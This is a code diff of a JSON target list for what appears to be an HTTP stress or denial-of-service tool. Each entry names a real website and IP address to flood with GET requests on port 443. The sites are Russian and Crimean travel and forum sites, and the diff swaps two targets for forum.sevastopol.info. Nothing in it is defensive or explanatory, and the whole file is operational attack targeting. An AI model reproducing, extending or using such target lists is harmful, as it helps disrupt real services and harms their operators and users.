@@ -9,6 +9,6 @@
   {"kind":"http_stress","method":"GET","ip":"87.236.16.130","port": 443, "url": "https://online-vokzal.ru/"},
   {"kind":"http_stress","method":"GET","ip":"45.130.41.77","port": 443, "url": "https://alushta24.org/"},
   {"kind":"http_stress","method":"GET","ip":"78.155.196.45","port": 443, "url": "https://www.kudanamore.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"193.107.238.13","port": 443, "url": "https://tourister.ru/"},
-  {"kind":"http_stress","method":"GET","ip":"78.155.198.133","port": 443, "url": "https://101hotels.com/"}
+  {"kind":"http_stress","method":"GET","ip":"172.67.135.162","port": 443, "url": "https://forum.sevastopol.info/"},
+  {"kind":"http_stress","method":"GET","ip":"104.21.26.79","port": 443, "url": "https://forum.sevastopol.info/"}
 ]
